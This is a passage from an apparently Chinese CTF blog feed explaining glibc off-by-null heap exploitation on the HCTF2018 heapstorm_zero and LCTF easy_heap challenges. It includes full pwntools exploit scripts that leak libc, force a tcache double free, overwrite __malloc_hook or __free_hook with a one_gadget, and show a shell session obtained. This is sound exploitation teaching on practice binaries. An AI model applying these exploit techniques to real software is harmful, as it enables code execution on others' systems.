0x3c4b20 + 8 + 0x20) + &apos;\x00&apos; * 0x10 + p64(0x41))</span><br><span class="line">add(0x38, &apos;\x00&apos; * 0x20 + p64(lbase + libc.sym[&apos;__malloc_hook&apos;] - 0x18))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 把 unsorted bin 分配掉</span><br><span class="line">add(0x18, &apos;a&apos; * 0x18)</span><br><span class="line"></span><br><span class="line"># 使用 top_chunk 分配，此时 top_chunk 位于 malloc_hook 上方， 修改 malloc_hook</span><br><span class="line">add(0x18, p64(lbase + 0xf02a4) * 2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># gdb.attach(p)</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free</span><br><span class="line"># malloc_printerr ---&gt; malloc_hook ---&gt; getshell</span><br><span class="line">dele(6)</span><br><span class="line">dele(8)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [DEBUG] Received 0x5b bytes:</span><br><span class="line">    &quot;*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***\n&quot;</span><br><span class="line">*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***</span><br><span class="line">$ id</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;id\n&apos;</span><br><span class="line">[DEBUG] Received 0x84 bytes:</span><br><span class="line">    00000000  75 69 64 3d  31 30 30 30  28 6a 69 6e  67 29 20 67  │uid=│1000│(jin│g) g│</span><br><span class="line">    00000010  69 64 3d 31  30 30 30 28  6a 69 6e 67  29 20 e7 bb  │id=1│000(│jing│) ··│</span><br><span class="line">    00000020  84 3d 31 30  30 30 28 6a  69 6e 67 29  2c 34 28 61  │·=10│00(j│ing)│,4(a│</span><br><span class="line">    00000030  64 6d 29 2c  32 34 28 63  64 72 6f 6d  29 2c 32 37  │dm),│24(c│drom│),27│</span><br><span class="line">    00000040  28 73 75 64  6f 29 2c 33  30 28 64 69  70 29 2c 34  │(sud│o),3│0(di│p),4│</span><br><span class="line">    00000050  36 28 70 6c  75 67 64 65  76 29 2c 31  31 33 28 6c  │6(pl│ugde│v),1│13(l│</span><br><span class="line">    00000060  70 61 64 6d  69 6e 29 2c  31 32 38 28  73 61 6d 62  │padm│in),│128(│samb│</span><br><span class="line">    00000070  61 73 68 61  72 65 29 2c  39 39 39 28  64 6f 63 6b  │asha│re),│999(│dock│</span><br><span class="line">    00000080  65 72 29 0a                                         │er)·││</span><br><span class="line">    00000084</span><br><span class="line">uid=1000(jing) gid=1000(jing) 组=1000(jing),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(docker)</span><br></pre></td></tr></table></figure><h2 id="另一种布局"><a href="#另一种布局" class="headerlink" title="另一种布局"></a>另一种布局</h2><p>为进一步理解 off by null , 下面以另一个 exp 的信息泄露过程为例介绍下堆的布局</p><p>来源 <a href="https://xz.aliyun.com/t/3253#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-2</a><br>首先分配若干个 chunk , 释放掉其中的第一个 chunk ，利用 scanf 触发堆合并构造 smallbin<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"AAA\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    add(<span class="number">0x38</span>, <span class="string">"A"</span> * <span class="number">8</span> + str(i) + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发堆合并， 构造 2 个 ， smallbin</span></span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure></p><p>此时 chunk 10 的 pre_size 为 0x180 , pre_inused = 0.</p><p><img alt="" data-src="/imgs/off-by-null-5.png" class="lozad"><br>图中颜色定义如下<br><img alt="" data-src="/imgs/off-by-null-6.png" class="lozad"></p><p>然后分配一个 0x40 的 chunk , 此时会用 0x180 大小的 smallbin 分配，分配后应该剩下 0x140 大小的 unsorted bin (bin 切割后会保存在 unsorted bin ) , 然后利用 off by null , 修改 unsorted bin 的大小为 0x100. 此时会出现 0x40 的空隙。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 分配比较大的内存，使用较大的 smallbin , 分配完后利用 off by null</span></span><br><span class="line"><span class="comment"># shrink unsorted bin 的大小</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"B"</span> * <span class="number">0x30</span> + p64(<span class="number">0x120</span>))</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-7.png" class="lozad"></p><p>下面在分配两个 chunk (4 5) , 然后释放 chunk 4 , 在利用 堆合并 将 fastbin 放入 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造 smallbin 为 合并时的 unlink 做准备</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"C"</span> * <span class="number">0x30</span> + p32(<span class="number">0x40</span>) + <span class="string">'\n'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"P"</span> * <span class="number">0x30</span> + <span class="string">'\n'</span>)  <span class="comment"># 5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># 触发堆合并，形成 smallbin</span></span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-8.png" class="lozad"></p><p>然后把 chunk 10 释放掉， 此时系统根据 chunk 10 的 pre_size 找到 smallbin 的位置进行合并， 由于 smallbin 此时已经在链表中，所以可以成功完成合并过程中的 unlink 操作， 然后会得到一个很大的 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 释放 chunk 10, 同时触发堆合并，形成 overlap chunk , 测试 chunk 5 被 overlap</span></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p>此时的内存布局如下图<br><img alt="" data-src="/imgs/off-by-null-9.png" class="lozad"></p><p>通过合并我们得到了一个 0x180 大小的 smallbin , 在这个大 smallbin 里面有一个还在使用的 chunk 5 , 同时还有之前分配剩下的 0x80 大小的 smallbin. 这样我就得到了 overlap heap.</p><p>下面新建 3 个 chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">"DDD\n"</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"KKK\n"</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"EEE\n"</span>)  <span class="comment"># 7</span></span><br></pre></td></tr></table></figure><p>由于malloc 分配内存的机制，会先从 0x80 的 smallbin 里面分配，然后才会去 0x180 的 smallbin 分配，所以内存布局如图。</p><p><img alt="" data-src="/imgs/off-by-null-10.png" class="lozad"></p><p>分配完成后 chunk 5 变成了 0x140 大小的 unsorted bin 的起始位置，于是可以利用 Puts 功能把 unsorted bin 的 指针打印出来， leak libc</p><h2 id="Tcache下的利用"><a href="#Tcache下的利用" class="headerlink" title="Tcache下的利用"></a>Tcache下的利用</h2><p>这是 lctf 的 easyheap , 用的是 libc 2.27 , 已经使用了 tcache</p><p>题目地址:<br><a href="https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap" target="_blank" rel="noopener">https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap</a> </p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>程序逻辑比较简单，漏洞位于 分配内存后，写内存时，如果 设置要 size 为 0xf8 就会 在 buf[0xf8] 写入一个字节。而 buf 是 0xf8 大小， 会有一字节的溢出。</p><p><img alt="" data-src="/imgs/off-by-null-11.png" class="lozad"></p><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>由于有 tcache 的存在利用 off by null 基本不可能，所以 off by null 要想办法去溢出 非 tcache bin 和 fastbin .</p><p>每个 tcache 最多 7 个 chunk , 所以可以先填满 7 个 chunk 到 tcache 后续的 chunk 就会进入 unsorted bin 里面了。</p><p>首先分配 10 个 chunk , 释放掉后面 7 个这7 个进入 tcache , 然后释放 前面 3 个，这3 个会进入 unsorted bin , 这个过程会在 chunk 2 的 pre_size 写入 0x200.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先释放后面的 chunk 填满 tcahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted bin</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  chunk 1 的 pre_size 为 0x100</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 2 的 pre_size 为 0x200</span></span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>此时的内存布局为</p><p><img alt="" data-src="/imgs/off-by-null-12.png" class="lozad"></p><p>接下来利用 off by null 构造 overlap chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chunk 7 进入 unsorted bin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 此时的分配会从 tcache 里面拿 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次 free chunk 8, 此时 tcache 没满，进入 tcache</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这时分配到的是 chunk 8 位于索引 1</span></span><br><span class="line"><span class="comment"># 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free 0 填充 tcache</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放 chunk 9 ，触发堆合并，形成 overlap chunk</span></span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><ul><li>首先 释放 chunk 7 , 它会进入 unsorted bin， 设它为 C .</li><li>然后分配一个 chunk 0, 消耗一个 tcache, 为后面做准备。</li><li>然后释放 chunk 8 , 此时 tcache 还有一个空位，会进入 tcache 设它为 B. 再次分配 chunk ,此时会再次拿到 刚刚释放的 B ,保存在 索引 1 （以后称它为 chunk 1）的位置， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</li><li>然后释放 chunk 9 , 由于 pre_size 和 pre_inused ，系统会找到 C , 然后把 C unlink , 由于此时 C 在 unsorted bin 链表上，会 正常 unlink , 之后形成一个 0x300 的 unsorted bin , 里面包含了 还在使用状态的 B</li></ul><p><img alt="" data-src="/imgs/off-by-null-13.png" class="lozad"></p><p>下面利用 unsorted bin 的切割机制，让指针落入 chunk 1 ， 然后利用 Puts 打印出来， leak libc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 把剩下的 tcache 里面的 bin 消耗掉</span><br><span class="line">for i in range(7):</span><br><span class="line">    malloc(8, &apos;/bin/sh&apos;)</span><br><span class="line"></span><br><span class="line"># 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leak</span><br><span class="line">malloc(1, &apos;8&apos;)</span><br></pre></td></tr></table></figure><p>首先把 tcache 使用掉，然后分配一个 chunk ,此时 chunk 1 会变成 unsorted bin 的起始地址。</p><p>然后打印 chunk 1 的内容，拿到 libc 的地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leak = puts(<span class="number">1</span>)</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x70</span></span><br><span class="line">info(<span class="string">"libc.address : "</span> + hex(libc.address))</span><br></pre></td></tr></table></figure></p><p>下面利用 tcache 的机制, 让两个 一样的 bin 链入 tcache ，为后续做准备。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分配到 chunk 1, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。</span></span><br><span class="line">free(<span class="number">0</span>)  <span class="comment"># 为了给后续申请腾出空间</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><ul><li>首先分配一 个 chunk , 这时 索引 1， 9 指向同一个 chunk，设这个 chunk 的名称为 A。</li><li>然后连续释放 1 和 9 ， 此时 tcache 里面会有两个 A .</li></ul><p><img alt="" data-src="/imgs/off-by-null-14.png" class="lozad"></p><p>然后在通过修改 tcache 的指针实现分配到 __free_hook, 修改 free_hook 为 one_gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hook</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次分配到 A</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 free_hook, 然后修改 free_hook 为 system</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(one_gadget))</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-15.png" class="lozad"><br>最后触发 free , 调用 one_gadget ，拿到 shell.</p><p>完整exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># context.terminal = ['tmux', 'splitw', '-v']</span></span><br><span class="line"></span><br><span class="line">path = <span class="string">"easy_heap"</span></span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">bin = ELF(path)</span><br><span class="line"></span><br><span class="line">p = process(path, aslr=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size'</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'content'</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    <span class="keyword">return</span> u64((p.recvline()[:<span class="number">-1</span>]).ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先释放后面的 chunk 填满 tcahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted bin</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  chunk 1 的 pre_size 为 0x100</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 2 的 pre_size 为 0x200</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 tcache 分配</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配 unsorted bin</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'7'</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'8'</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次让 chunk 回到 tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 7 进入 unsorted bin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 此时的分配会从 tcache 里面拿 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次 free chunk 8, 此时 tcache 没满，进入 tcache</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这时分配到的是 chunk 8 位于索引 1</span></span><br><span class="line"><span class="comment"># 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free 0 填充 tcache</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放 chunk 9 ，触发堆合并，形成 overlap chunk</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把剩下的 tcache 里面的 bin 消耗掉</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">8</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leak</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'8'</span>)</span><br><span class="line"></span><br><span class="line">leak = puts(<span class="number">1</span>)</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x70</span></span><br><span class="line">info(<span class="string">"libc.address : "</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 chunk 8, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0xe42ee</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hook</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># 再次分配到 A</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 free_hook, 然后修改 free_hook 为 system</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发 free_hook</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>参考<br><a href="https://www.cnblogs.com/hac425/p/9993716.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9993716.html</a><br><a href="https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/exp.py" target="_blank" rel="noopener">https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/exp.py</a><br><a href="https://xz.aliyun.com/t/3253#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。&lt;/p&gt;
&lt;p&gt;题目
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>unlink</title>
    <link href="https://nocbtm.github.io/2020/02/27/unlink/"/>
    <id>https://nocbtm.github.io/2020/02/27/unlink/</id>
    <published>2020-02-27T06:38:52.000Z</published>
    <updated>2020-04-08T14:04:21.111Z</updated>
    
